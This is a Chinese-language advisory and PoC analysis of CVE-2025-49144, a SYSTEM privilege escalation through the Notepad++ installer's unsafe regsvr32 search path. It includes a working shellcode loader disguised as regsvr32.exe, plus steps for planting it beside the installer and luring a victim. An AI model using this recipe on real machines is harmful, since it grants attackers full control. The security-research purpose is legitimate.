## CVE-2025-49144 - Notepad++ 权限提升 (Privilege Escalation)

**漏洞编号:** CVE-2025-49144

**漏洞类型:** 权限提升 (Privilege Escalation)

**影响应用:** Notepad++

**危害等级:** 高危 (High) - 攻击者可获得目标机器的完全控制权

**CVSS评分:** N/A - Awaiting NVD analysis

**影响版本:** 8.8.1 及之前版本 (versions 8.8.1 and prior)

**利用条件:** 需要用户交互 (社会工程学或点击劫持)，攻击者需诱导用户下载恶意文件并将其与合法安装程序置于同一目录并运行安装程序。

**POC 可用性:** 9/10

**POC 类型:** 完整利用 (Full Exploit/Demonstration)

**攻击复杂度:** 中 (Medium)

**投毒风险:** 10%

## 详情

此漏洞（CVE-2025-49144）源于Notepad++ v8.8.1及之前版本的安装程序在寻找系统工具`regsvr32`时存在不安全的搜索路径问题。具体来说，安装程序在以SYSTEM权限运行时，会优先在其当前工作目录中查找`regsvr32.exe`，而非直接使用其绝对路径或仅搜索系统路径。攻击者可以利用此特性，通过社会工程学或点击劫持等手段，诱导受害者将一个恶意构造的`regsvr32.exe`文件与Notepad++的合法安装程序下载到同一目录。当受害者运行安装程序时，系统会自动以SYSTEM权限加载并执行攻击者提供的恶意`regsvr32.exe`，从而导致权限提升。

**POC有效性分析:**
所提供的POC代码详细演示了此漏洞的利用过程。它首先创建了一个简单的C#程序，其功能是在`C:\Windows\Temp`目录下创建一个名为`NOTEPAD_VULNERABIL.txt`的文本文件，其中包含“Acest fisier demonstreaza executia de cod cu privilegii de SYSTEM.”的字符串，以此证明代码是以SYSTEM权限执行的。随后，该C#代码通过`donut`工具转换为shellcode，并被嵌入到一个小型C语言程序中。该C程序负责在内存中分配可执行空间，将shellcode复制进去，设置内存保护为可执行，并通过创建线程执行shellcode。最终，这个C程序被编译成一个名为`regsvr32.exe`的可执行文件。当这个恶意的`regsvr32.exe`与Notepad++安装程序放置在同一目录下并运行安装程序时，恶意代码将以SYSTEM权限执行，成功在`C:\Windows\Temp`中创建证明文件，证实了POC的有效性。这种利用方式清晰且直接，展现了权限提升的完整流程。

**利用步骤:**
1.  **准备恶意代码:** 编写一个C#程序（例如`PoC.cs`），包含想要执行的恶意逻辑。在当前POC中，它仅创建一个文本文件。
    ```csharp
    using System.IO;
    public class PoC {
        public static void Main() {
            File.WriteAllText(@"C:\Windows\Temp\NOTEPAD_VULNERABIL.txt", "Acest fisier demonstreaza executia de cod cu privilegii de SYSTEM.");
        }
    }
    ```
2.  **生成Shellcode:** 使用`donut`工具将编译后的C#程序转换为shellcode，并将其存储在一个头文件（如`payload.h`）中。
3.  **构建恶意加载器:** 编写一个C语言程序，用于加载并执行上述生成的shellcode。将`payload.h`包含到C代码中，并在`WinMain`函数中实现内存分配、shellcode复制、内存保护设置和线程执行等逻辑。
    ```c
    #include <windows.h>
    #include "payload.h"
    
    int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
        unsigned int payload_len = sizeof(payload);
        void * exec_mem;
        BOOL rv;
        HANDLE th;
        DWORD oldprotect = 0;
        exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (exec_mem == NULL) { return 1; }
        RtlMoveMemory(exec_mem, payload, payload_len);
        rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
        if ( rv != 0 ) {
                th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
                WaitForSingleObject(th, -1);
        }
        return 0;
    }
    ```
4.  **编译为恶意可执行文件:** 将上述C程序编译为名为`regsvr32.exe`的可执行文件。
5.  **部署和诱导:** 将编译后的恶意`regsvr32.exe`文件与Notepad++的合法安装程序（版本8.8.1或更早）放置在受害者的同一目录下。
6.  **执行攻击:** 诱导受害者运行Notepad++的合法安装程序。当安装程序启动时，它将加载并执行同一目录下的恶意`regsvr32.exe`，从而以SYSTEM权限执行攻击者预设的shellcode。

**投毒风险分析:**
提供的POC代码是纯粹用于演示漏洞原理和有效性的，其设计目标是安全研究，而非恶意攻击。POC中包含的C#脚本仅执行了创建一个文本文件的无害操作，没有任何数据窃取、系统破坏、持久化或远程控制等恶意行为。代码本身清晰易懂，没有使用混淆技术，也未发现任何与外部可疑资源通信或下载额外组件的行为。`donut`工具作为合法的shellcode生成器，其使用符合安全研究规范。因此，直接使用*此特定POC代码*进行研究或复现，其“投毒风险”极低，可以评估为10%。

然而，需要强调的是，尽管POC本身无害，但它所利用的漏洞机制（不安全的可执行文件搜索路径导致的权限提升）是一个非常严重的攻击面。恶意攻击者可以轻易地将POC中的无害payload替换为功能强大的恶意payload，例如：后门或远程控制木马（建立对受害机器的持久化控制）、勒索软件（加密用户数据并索要赎金）、数据窃取器（窃取敏感信息，如凭据、文档）或蠕虫/病毒（利用SYSTEM权限进一步感染网络中的其他机器）。因此，虽然POC本身无害，但该漏洞本身的利用潜力巨大，对组织构成的高风险威胁不容忽视。防御措施应侧重于修复漏洞本身，并加强用户安全意识教育，防范社会工程学攻击。

**项目地址:** 

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-49144
